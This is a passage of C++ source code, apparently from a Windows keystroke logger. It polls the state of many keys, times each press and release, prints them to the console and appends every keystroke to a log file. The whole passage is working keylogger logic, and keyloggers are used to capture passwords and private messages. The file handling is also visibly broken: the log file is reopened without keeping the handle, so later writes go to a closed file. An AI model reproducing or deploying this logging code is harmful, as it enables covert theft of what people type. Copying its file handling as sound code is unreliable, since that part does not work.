            if ((keyState = ::GetAsyncKeyState(VK_SHIFT))) keyState & keySize ? keyStream.add(Shift, true) : keyStream.add(Shift, false); else if (keyStream.has(Shift)) { KeyInformation& keyInformation = keyStream.get(Shift); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_SLEEP))) keyState & keySize ? keyStream.add(Keys::Sleep, true) : keyStream.add(Keys::Sleep, false); else if (keyStream.has(Keys::Sleep)) { KeyInformation& keyInformation = keyStream.get(Keys::Sleep); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_SPACE))) keyState & keySize ? keyStream.add(Spacebar, true) : keyStream.add(Spacebar, false); else if (keyStream.has(Spacebar)) { KeyInformation& keyInformation = keyStream.get(Spacebar); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_LAUNCH_MAIL))) keyState & keySize ? keyStream.add(StartMail, true) : keyStream.add(StartMail, false); else if (keyStream.has(StartMail)) { KeyInformation& keyInformation = keyStream.get(StartMail); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = (
                ::GetAsyncKeyState(0x88) || ::GetAsyncKeyState(0x89) || ::GetAsyncKeyState(0x8A) || ::GetAsyncKeyState(0x8B) || ::GetAsyncKeyState(0x8C) || ::GetAsyncKeyState(0x8D) || ::GetAsyncKeyState(0x8E) || ::GetAsyncKeyState(0x8F) ||
                ::GetAsyncKeyState(0x97) || ::GetAsyncKeyState(0x98) || ::GetAsyncKeyState(0x99) || ::GetAsyncKeyState(0x9A) || ::GetAsyncKeyState(0x9B) || ::GetAsyncKeyState(0x9C) || ::GetAsyncKeyState(0x9D) || ::GetAsyncKeyState(0x9E) || ::GetAsyncKeyState(0x9F) ||
                ::GetAsyncKeyState(0xD8) || ::GetAsyncKeyState(0xD9) || ::GetAsyncKeyState(0xDA) ||
                ::GetAsyncKeyState(0xE8)
            ))) keyState & keySize ? keyStream.add(Unassigned, true) : keyStream.add(Unassigned, false); else if (keyStream.has(Unassigned)) { KeyInformation& keyInformation = keyStream.get(Unassigned); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(0x07))) keyState & keySize ? keyStream.add(Undefined, true) : keyStream.add(Undefined, false); else if (keyStream.has(Undefined)) { KeyInformation& keyInformation = keyStream.get(Undefined); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_UP))) keyState & keySize ? keyStream.add(UpArrow, true) : keyStream.add(UpArrow, false); else if (keyStream.has(UpArrow)) { KeyInformation& keyInformation = keyStream.get(UpArrow); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_VOLUME_DOWN))) keyState & keySize ? keyStream.add(VolumeDown, true) : keyStream.add(VolumeDown, false); else if (keyStream.has(VolumeDown)) { KeyInformation& keyInformation = keyStream.get(VolumeDown); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_VOLUME_MUTE))) keyState & keySize ? keyStream.add(VolumeMute, true) : keyStream.add(VolumeMute, false); else if (keyStream.has(VolumeMute)) { KeyInformation& keyInformation = keyStream.get(VolumeMute); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_VOLUME_UP))) keyState & keySize ? keyStream.add(VolumeUp, true) : keyStream.add(VolumeUp, false); else if (keyStream.has(VolumeUp)) { KeyInformation& keyInformation = keyStream.get(VolumeUp); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
            if ((keyState = ::GetAsyncKeyState(VK_ZOOM))) keyState & keySize ? keyStream.add(Zoom, true) : keyStream.add(Zoom, false); else if (keyStream.has(Zoom)) { KeyInformation& keyInformation = keyStream.get(Zoom); keyInformation.activated ? keyInformation.release() : keyStream.remove(keyInformation); }
        #elif defined(linux) || defined(__linux) || defined(__linux__)
        #elif defined(unix) || defined(__unix) || defined(__unix__)
        #elif defined(__APPLE__) || defined(__MACH__)
        #elif defined(__ANDROID__)
        #endif

        // Logic > Update > Keystroke Log File
        if (keyStreamLength) { ::fclose(keystrokeLogFile); ::fopen(keystrokeLogFileName, "a"); }

        // Loop --- NOTE (Lapys) -> Log the state of the keyboard`s events via keystrokes.
        for (unsigned char keyStreamIterator = 0u; keyStreamIterator ^ keyStreamLength; keyStreamIterator += 1u) {
            // Declaration > Key (Information)
            KeyInformation& keyInformation = keyStream.get(keyStreamIterator);
            const Key key = keyInformation.key;

            // Logic
            if (keyInformation.activated) {
                // Logic
                if (!activeKeyStream.has(key)) {
                    // Logic > Print
                    if (!(
                        (key == Shift && (keyStream.has(LeftShift) || keyStream.has(RightShift))) ||
                        ((
                            key == CharacterA || key == CharacterB || key == CharacterC || key == CharacterD || key == CharacterE || key == CharacterF || key == CharacterG || key == CharacterH || key == CharacterI || key == CharacterJ || key == CharacterK || key == CharacterL || key == CharacterM || key == CharacterN || key == CharacterO || key == CharacterP || key == CharacterQ || key == CharacterR || key == CharacterS || key == CharacterT || key == CharacterU || key == CharacterV || key == CharacterW || key == CharacterX || key == CharacterY || key == CharacterZ ||
                            key == Digit0 || key == Digit1 || key == Digit2 || key == Digit3 || key == Digit4 || key == Digit5 || key == Digit6 || key == Digit7 || key == Digit8 || key == Digit9
                        ) && (keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)))
                    )) ::printf("%s (pressed)\n", KeyStream::keyInformationToString(keyStream, keyInformation));

                    // Update > (Active Key Stream, Keystroke Log File)
                    activeKeyStream.add(keyInformation);
                    ::fprintf(keystrokeLogFile, "%s[P]\n", KeyStream::keyInformationToString(keyStream, keyInformation));
                }

                // Update > Key Information
                keyInformation.tick();
            }

            else {
                // Constant > Key Information ...
                const double keyInformationActiveEventTime = keyInformation.getTimeInSeconds();
                const char *keyInformationString = KeyStream::keyInformationToString(keyStream, keyInformation);

                // Print
                ::printf("%s (pressed) for %f seconds\n", keyInformationString, keyInformationActiveEventTime);
                ::printf("%s (released)\n", keyInformationString);

                // Logic > Update > Keystroke Log File
                if (keyInformationActiveEventTime) ::fprintf(keystrokeLogFile, "%s[R after %fs]\n", keyInformationString, keyInformationActiveEventTime);
                else ::fprintf(keystrokeLogFile, "%s[R]\n", keyInformationString);

                // Deletion
                activeKeyStream.remove(key);
            }
        }

        // Logic > Update > Keystroke Log File
        if (keyStreamLength) ::fclose(keystrokeLogFile);
    }

    // Return
    return 0;
}
